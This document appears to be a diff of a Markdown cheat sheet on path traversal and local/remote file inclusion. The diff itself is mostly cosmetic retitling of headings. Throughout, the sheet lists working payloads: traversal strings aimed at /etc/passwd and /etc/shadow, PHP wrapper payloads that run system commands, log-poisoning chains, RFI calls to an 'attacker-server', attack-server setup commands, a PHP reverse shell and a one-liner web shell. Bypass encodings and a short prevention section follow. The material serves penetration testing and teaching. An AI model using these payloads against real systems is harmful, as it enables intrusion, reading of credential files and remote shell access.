@@ -6,13 +6,11 @@
 
 ---
 
-Path traversal and local/remote file inclusion: payloads, PHP wrappers, and log-poisoning chains.
+## Basic Path Traversal Patterns
 
-## Basic path traversal patterns
+### Linux Systems
 
-### Linux
-
-```txt
+```
 ../../../etc/passwd
 ....//....//....//etc/passwd
 ..%2f..%2f..%2fetc%2fpasswd
@@ -20,19 +18,19 @@ Path traversal and local/remote file inclusion: payloads, PHP wrappers, and log-
 ..%252f..%252f..%252fetc%252fpasswd
 ```
 
-### Windows
+### Windows Systems
 
-```txt
+```
 ..\..\..\windows\system32\drivers\etc\hosts
 ....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
 ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
 ```
 
-## Common target files
+## Common Target Files
 
-### Linux configuration files
+### Linux Configuration Files
 
-```txt
+```
 /etc/passwd          # User accounts
 /etc/shadow          # Password hashes (requires root)
 /etc/group           # Groups
@@ -46,9 +44,9 @@ Path traversal and local/remote file inclusion: payloads, PHP wrappers, and log-
 /proc/net/fib_trie   # Network routing
 ```
 
-### Web server files
+### Web Server Files
 
-```txt
+```
 /var/log/apache2/access.log
 /var/log/apache2/error.log
 /var/log/nginx/access.log
@@ -58,9 +56,9 @@ Path traversal and local/remote file inclusion: payloads, PHP wrappers, and log-
 /var/www/html/index.php
 ```
 
-### Application configuration
+### Application Configuration
 
-```txt
+```
 /etc/mysql/my.cnf
 /etc/postgresql/postgresql.conf
 /etc/ssh/sshd_config
@@ -69,43 +67,43 @@ Path traversal and local/remote file inclusion: payloads, PHP wrappers, and log-
 /root/.bash_history
 ```
 
-## PHP wrappers
+## PHP Wrappers Exploitation
 
-### php://filter (source code disclosure)
+### php://filter (Source Code Disclosure)
 
-```txt
+```
 php://filter/read=convert.base64-encode/resource=index.php
 php://filter/convert.base64-encode/resource=config.php
 php://filter/read=string.rot13/resource=index.php
 php://filter/read=convert.quoted-printable-encode/resource=index.php
 ```
 
-### php://input (POST data execution)
+### php://input (POST Data Execution)
 
-```txt
+```
 POST request to: ?file=php://input
 POST body: <?php system($_GET['cmd']); ?>
 Then: ?file=php://input&cmd=id
 ```
 
-### data:// (direct code execution)
+### data:// (Direct Code Execution)
 
-```txt
+```
 data://text/plain,<?php system($_GET['cmd']); ?>
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
 ```
 
-### expect:// (command execution)
+### expect:// (Command Execution)
 
-```txt
+```
 expect://id
 expect://whoami
 expect://cat /etc/passwd
 ```
 
-## Log poisoning
+## Log Poisoning Techniques
 
-### Apache access log
+### Apache Access Log Poisoning
 
 1. **Inject payload via User-Agent:**
 
@@ -114,12 +112,11 @@ expect://cat /etc/passwd
    ```
 
 2. **Access log via LFI:**
-
-   ```txt
+   ```
    ?file=../../../var/log/apache2/access.log&cmd=id
    ```
 
-### SSH log
+### SSH Log Poisoning
 
 1. **Inject via SSH username:**
 
@@ -128,12 +125,11 @@ expect://cat /etc/passwd
    ```
 
 2. **Access auth log:**
-
-   ```txt
+   ```
    ?file=../../../var/log/auth.log&cmd=whoami
    ```
 
-### Mail log
+### Mail Log Poisoning
 
 1. **Send mail with PHP payload:**
 
@@ -142,22 +138,21 @@ expect://cat /etc/passwd
    ```
 
 2. **Access mail log:**
-
-   ```txt
+   ```
    ?file=../../../var/log/mail.log&cmd=id
    ```
 
-## Remote file inclusion (RFI)
+## Remote File Inclusion (RFI)
 
-### Test for RFI support
+### Test for RFI Support
 
-```txt
+```
 ?file=http://attacker-server/test.txt
 ?file=ftp://attacker-server/test.txt
 ?file=\\attacker-server\share\test.txt  # Windows SMB
 ```
 
-### Attack server
+### Setting Up Attack Server
 
 ```bash
 # Python HTTP server
@@ -170,9 +165,9 @@ php -S 0.0.0.0:8080
 python3 -m pyftpdlib -p 21 -w
 ```
 
-### Reverse shell payloads
+### Reverse Shell Payloads
 
-**PHP reverse shell:**
+**PHP Reverse Shell:**
 
 ```php
 <?php
@@ -183,46 +178,46 @@ exec("/bin/bash -i <&3 >&3 2>&3", $sock);
 ?>
 ```
 
-**One-liner PHP shell:**
+**One-liner PHP Shell:**
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-## Bypass techniques
+## Bypass Techniques
 
-### Null byte injection (PHP < 5.3.4)
+### Null Byte Injection (PHP < 5.3.4)
 
-```txt
+```
 ?file=../../../etc/passwd%00
 ?file=../../../etc/passwd%00.jpg
 ```
 
-### Double encoding
+### Double Encoding
 
-```txt
+```
 %252e%252e%252f  # ../
 %252e%252e%255c  # ..\
 ```
 
-### Unicode bypass
+### Unicode Bypass
 
-```txt
+```
 ..%c0%af
 ..%c1%9c
 ```
 
-### Filter bypass
+### Filter Bypass
 
-```txt
+```
 ....//
 ...\\/
 ....\\
 ```
 
-## Detection and enumeration
+## Detection and Enumeration
 
-### Check for LFI
+### Check for LFI Vulnerability
 
 ```bash
 # Basic test
@@ -235,9 +230,9 @@ ffuf -u "http://target/FUZZ" -w /path/to/lfi-wordlist.txt
 wfuzz -u "http://target/?file=FUZZ" -w lfi-payloads.txt
 ```
 
-### Identify OS and services
+### Identify OS and Services
 
-```txt
+```
 # Linux detection
 ?file=../../../etc/passwd
 ?file=../../../proc/version
@@ -251,9 +246,9 @@ wfuzz -u "http://target/?file=FUZZ" -w lfi-payloads.txt
 ?file=../../../var/log/nginx/access.log
 ```
 
-## Prevention
+## Prevention and Remediation
 
-### Secure coding
+### Secure Coding Practices
 
 ```php
 // Input validation
@@ -274,7 +269,7 @@ if (strpos($file, '/var/www/pages/') === 0) {
 }
 ```
 
-### Server configuration
+### Server Configuration
 
 - Disable dangerous PHP functions: `allow_url_include`, `allow_url_fopen`
 - Use `open_basedir` restriction
@@ -282,7 +277,7 @@ if (strpos($file, '/var/www/pages/') === 0) {
 - Enable logging and monitoring
 - Use Web Application Firewall (WAF)
 
-## Common LFI to RCE chains
+## Common LFI to RCE Chains
 
 1. **LFI → Log Poisoning → RCE**
 2. **LFI → Session File Poisoning → RCE**
@@ -290,7 +285,7 @@ if (strpos($file, '/var/www/pages/') === 0) {
 4. **LFI → PHP Wrapper → RCE**
 5. **LFI → RFI → RCE**
 
-## Tools
+## Useful Tools
 
 - **ffuf** - Fast web fuzzer
 - **Burp Suite** - Web application testing
@@ -298,8 +293,3 @@ if (strpos($file, '/var/www/pages/') === 0) {
 - **LFISuite** - Automated LFI exploitation
 - **fimap** - File inclusion mapper
 - **Kadimus** - LFI exploitation tool
-
-## Resources
-
-- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md) — wrappers, poisoning, RFI
-- [HackTricks — File inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html) — LFI/RFI techniques
